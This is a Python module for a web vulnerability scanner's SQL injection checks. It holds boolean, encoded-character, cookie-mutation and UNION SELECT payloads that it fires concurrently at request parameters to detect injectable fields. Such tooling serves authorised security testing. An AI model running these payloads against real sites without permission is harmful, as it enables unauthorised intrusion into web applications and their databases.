import time
import asyncio
import re
import xml.etree.ElementTree as ET
from pathlib import Path
import random
import base64
import json
from http.cookiejar import CookieJar
import copy
from difflib import SequenceMatcher

from components.attack.base_attack import BaseAttack
from components.main.logger import logger
from components.parsers.html import HTML
from components.web.request import Request

class SQLInjection(BaseAttack):
    name = 'sqli'

    SPECIAL_CHARS = ["'", '"', ";", ")", "*"]
    ENCODED_CHARS = ["%27", "%22", "%3B", "%29", "%2A", "%25%27"]
    BOOLEAN_PAYLOAD_PAIRS = [
        ("' OR 1=1-- ",    "' OR 1=2-- "),
        ('" OR 1=1-- ',    '" OR 1=2-- '),
        (" OR 1=1-- ",     " OR 1=2-- "),
        ("' OR 'a'='a'-- ", "' OR 'a'='b'-- "),
        ('" OR "a"="a"-- ', '" OR "a"="b"-- '),
        ("') OR ('1'='1'-- ", "') OR ('1'='2'-- "),
        ('") OR ("1"="1"-- ', '") OR ("1"="2"-- '),
        ("' OR 'x'||'x'='x'-- ", "' OR 'x'||'x'='y'-- "),
        ("' OR TRUE-- ",    "' OR FALSE-- "),
        ("' OR 1=1# ",      "' OR 1=2# "),
        ("' OR 1=1/*",      "' OR 1=2/*"),
        ("' Or 1=1-- ",     "' Or 1=2-- "),
        ("' OR (SELECT 1)=1-- ", "' OR (SELECT 1)=2-- "),
    ]
    
    SKIP_PARAMS = ['user_token', 'csrf_token', 'session_id', 'auth_token', 'auth_key', 'token']

    def __init__(self, crawler, crawler_config, wordlist_path):
        super().__init__(crawler, crawler_config, wordlist_path)
        if not self.wordlist_path:
            self.payloads = self._load_payload_files()
            
        self.error_regexes = self._load_error_regexes()
        
        self.semaphore = asyncio.Semaphore(50)
        self.tested_cookies = set()
        
    def _load_payload_files(self):
        base = Path(__file__).parent.parent / 'payloads' / 'sqli'
        mapping = {
            'error': 'sqli_error.txt',
            'time': 'sqli_time.txt',
            'union': 'sqli_union.txt',
            'auth_bypass': 'sqli_auth_bypass.txt',
        }
        
        out = {}
        for kind, fname in mapping.items():
            path = base / fname
            try:
                with open(path, encoding='utf-8') as f:
                    lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                out[kind] = lines
                
            except Exception as e:
                logger.error(f"[sqli] cannot load payload file {path}: {e}")
                out[kind] = []
        return out

    def _load_error_regexes(self):

        xml_path = Path(__file__).parent.parent / 'payloads' / 'sqli' / 'database_errors.xml'
        db_regex_map = {}

        if not xml_path.exists():
            logger.error(f"[sqli] error‐regex file not found: {xml_path}")
            return db_regex_map

        try:
            tree = ET.parse(xml_path)
            root = tree.getroot()
            # iterate over each <dbms value="...">
            for dbms in root.findall('.//dbms'):
                db_name = dbms.get('value')
                if not db_name:
                    continue

                regex_list = []
                for err in dbms.findall('error'):
                    pat = err.get('regexp')
                    if not pat:
                        continue
                    try:
                        regex_list.append(re.compile(pat, re.IGNORECASE))
                    except re.error as rex:
                        logger.error(f"[sqli] invalid regex {pat} for {db_name} in {xml_path}: {rex}")

                if regex_list:
                    db_regex_map[db_name] = regex_list

        except Exception as e:
            logger.error(f"[sqli] failed to parse {xml_path}: {e}")

        return db_regex_map


    async def run(self, request, response):
        if not request.get_params and not request.post_params:
            return
        
        await self.test_cookies(request, response)
        
        #print(f"Testing {request}")
        start = time.time()
        vulnerable_parameters = await self.potentially_injectable(request)
        end = time.time() - start
        #print(f'time taken: {end:.2f}s')
        
        if not vulnerable_parameters:
            return
        #print(vulnerable_parameters, request)

        error_tasks = []
        for payload in self.payloads['error']:
            for mutated, param in self.mutate_request(request, payload, mode='append'):
                if param in vulnerable_parameters:
                    error_tasks.append(asyncio.create_task( self._test_error(mutated, request, param, payload)))
        
        try:
            for task in asyncio.as_completed(error_tasks):
                if await task:
                    for t in error_tasks:
                        t.cancel()
                    return
        finally:
            for t in error_tasks:
                if not t.done():
                    t.cancel()
        
        for param in vulnerable_parameters:
            if await self._test_union(request, param):
                return


    async def test_cookies(self, request, response):
        jar = self.crawler.cookies
        cookies = jar.items()
        
        for name, val in cookies:
            trials = []
            if name in self.tested_cookies:
                continue
            self.tested_cookies.add(name)

            for payload in self.SPECIAL_CHARS:
                trials.append((val + payload, f"{name} raw + {payload!r}"))

            try:
                decoded = base64.b64decode(val).decode("utf-8")
                data = json.loads(decoded)
                for field, fld_val in data.items():
                    if isinstance(fld_val, str):
                        for payload in self.SPECIAL_CHARS:
                            obj = data.copy()
                            obj[field] = fld_val + payload
                            new_b64 = base64.b64encode(
                                json.dumps(obj).encode()
                            ).decode()
                            desc = f"{name} : {field}  + {payload}"
                            trials.append((new_b64, desc))
            except Exception:
                pass

        
            for new_val, desc in trials:
                hdrs = self.crawler.headers  
                hdrs['Cookie'] = "; ".join(
                    f"{k}={new_val if k == name else v}"
                    for k, v in cookies
                )

                try:
                    resp = await self.crawler.send(request, timeout=1, headers =hdrs)
                except Exception:
                    continue
                
                if self._find_error(resp.text):
                    logger.log('HIGH', "SQL Injection via cookie detected")
                    logger.log("VULN", f"Target: {request.url}")
                    logger.log("VULN", f"Cookie mutation: {desc}")
                    print()
                    return 
                
                if resp.status_code != response.status_code:
                    logger.log('MEDIUM', "SQL Injection via cookie detected (status code change)")
                    logger.log("VULN", f"Target: {request.url}")
                    logger.log("VULN", f"Cookie mutation: {desc}")
                    logger.log("VULN", f"Status code changed from {response.status_code} to {resp.status_code}")
                    print()
                    return 

        return 
       
    async def potentially_injectable(self, request):
        vulnerable_parameters = set()
        all_params = set(request.get_params or request.post_params)

        async def _test_error_payload(mutated, param, payload):
            try:
                async with self.semaphore:
                    resp = await self.crawler.send(mutated, timeout=1)
            except Exception:
                return None
            return param if self._find_error(resp.text) else None

        # Phase 1: Special-char probes
        special_tasks = []
        for char in self.SPECIAL_CHARS:
            for mut, param in self.mutate_request(request, char, mode='append'):
                if param not in self.SKIP_PARAMS:
                    special_tasks.append(asyncio.create_task(_test_error_payload(mut, param, char)))    
        
        for task in asyncio.as_completed(special_tasks):
            param = await task
            if param:
                vulnerable_parameters.add(param)
                if vulnerable_parameters == all_params:
                    # cancel leftovers
                    for t in special_tasks:
                        if not t.done():
                            t.cancel()
                    return vulnerable_parameters

        # Phase 2: URL-/double-encoding tricks
        encoded_tasks = [
            asyncio.create_task(_test_error_payload(mut, param, enc))
            for enc in self.ENCODED_CHARS
            for mut, param in self.mutate_request(request, enc, mode='append')
            if param not in vulnerable_parameters and param not in self.SKIP_PARAMS
        ]
        for task in asyncio.as_completed(encoded_tasks):
            param = await task
            if param:
                vulnerable_parameters.add(param)
                if vulnerable_parameters == all_params:
                    for t in encoded_tasks:
                        if not t.done():
                            t.cancel()
                    return vulnerable_parameters

        # Phase 3: Boolean flips
        async def _test_boolean_pair(mutated_true, mutated_false, param):
            try:
                async with self.semaphore:
                    resp_t = await self.crawler.send(mutated_true, timeout=1)
                    resp_f = await self.crawler.send(mutated_false, timeout=1)
            except Exception:
                return None

            if resp_t.status_code != resp_f.status_code:
                return param
            if abs(len(resp_t.text) - len(resp_f.text)) > 10:
                return param
            if SequenceMatcher(None, resp_t.text, resp_f.text).ratio() < 0.95:
                return param
            return None

        boolean_tasks = []
        for payload_true, payload_false in self.BOOLEAN_PAYLOAD_PAIRS:
            trues = list(self.mutate_request(request, payload_true,  mode='append'))
            falses = list(self.mutate_request(request, payload_false, mode='append'))
            for (mutated_true, p1), (mutated_false, p2) in zip(trues, falses):
                if p1 == p2 and p1 not in vulnerable_parameters:
                    boolean_tasks.append(asyncio.create_task(_test_boolean_pair(mutated_true, mutated_false, p1)))

        for task in asyncio.as_completed(boolean_tasks):
            param = await task
            if param:
                vulnerable_parameters.add(param)
                if vulnerable_parameters == all_params:
                    for t in boolean_tasks:
                        if not t.done():
                            t.cancel()
                    break

        return vulnerable_parameters

    
    
    def _find_error(self, text):
        text_small = text
        for dbms, regexes in self.error_regexes.items():
            for regex in regexes:
                if regex.search(text_small):
                    return str(dbms)
        return ''
        
    async def _false_positive(self, request):
        try:
            resp = await self.crawler.send(request, timeout = 3)
            
        except Exception:
            pass
        
        else:
            if self._find_error(resp.text):
                return True
            
        return False

    async def _test_error(self, mutated, request, param, payload):
        
        if param == 'user_token':
            return False
        #logger.debug(f"{mutated} Testing {param} (error) with payload {payload!r}")
        
        try:
            async with self.semaphore:
                resp = await self.crawler.send(mutated, timeout = 3, redirect = False)
                text = resp.text
            
        except Exception as e:
            logger.error(f"Error-based request failed {mutated}: {e}")
            return False
        
        else:
            vulnerability = self._find_error(text)

            if vulnerability and not await self._false_positive(request):
                logger.critical(f'SQL Injection Error Based Detected')
                
                logger.log("VULN", f'Target: {mutated.url}')
                logger.log("VULN", f'Method: {mutated.method}')
                logger.log("VULN", f'Parameter: {param}')
                logger.log("VULN", f'Payload: {payload}')
                logger.log("VULN", f'Database: {vulnerability}')
                
                #logger.log("VULN", f'Possbile CVE: {vulnerability} {self.search_cve(vulnerability)['description']}')
                print()
                
                return True
                
            return False        
                
                    
    async def _test_union(self, request, param):
        """
        Detect a UNION-based injection by:
         1) Finding the column count via status codes (200 vs. 500).
         2) Probing each column individually for reflection.
        """
        max_columns = 12
        col_count   = None

        for n in range(1, max_columns + 1):
            nulls   = ",".join(["NULL"] * n)
            payload = f"' UNION SELECT {nulls}--"

            for mutated, p in self.mutate_request(request, payload, mode='append'):
                if p != param:
                    continue
                try:
                    resp = await self.crawler.send(mutated, timeout=5, redirect=False)
                except Exception:
                    break

                if resp.status_code < 500:
                    col_count = n
                break

            if col_count:
                break

        if not col_count:
            return False 

   
        markers = [
            f"{random.getrandbits(32):08X}"
            for _ in range(col_count)
        ]

        for idx, marker in enumerate(markers):
            # build a payload that injects our marker into column `idx`
            cols = []
            for j in range(col_count):
                if j == idx:
                    # use CONCAT + <mark> tags to survive HTML-escaping
                    cols.append(f"0x{int(marker,16):X}")
                else:
                    cols.append("NULL")

            payload = f"' UNION SELECT {','.join(cols)}--"

            for mutated, p in self.mutate_request(request, payload, mode='append'):
                if p != param:
                    continue
                try:
                    resp = await self.crawler.send(mutated, timeout=5, redirect=False)
                except Exception:
                    continue
                if resp.status_code >= 500:
                    continue

                if marker in resp.text:
                    logger.critical(f"SQL Injection UNION based SQLi detected")
                    logger.log("VULN", f'Target: {mutated.url}')
                    logger.log("VULN", f'Method: {mutated.method}')
                    logger.log("VULN", f'Parameter: {p}')
                    logger.log("VULN", f"Payload: {payload}")
                    print()
                    return True
                    

        return False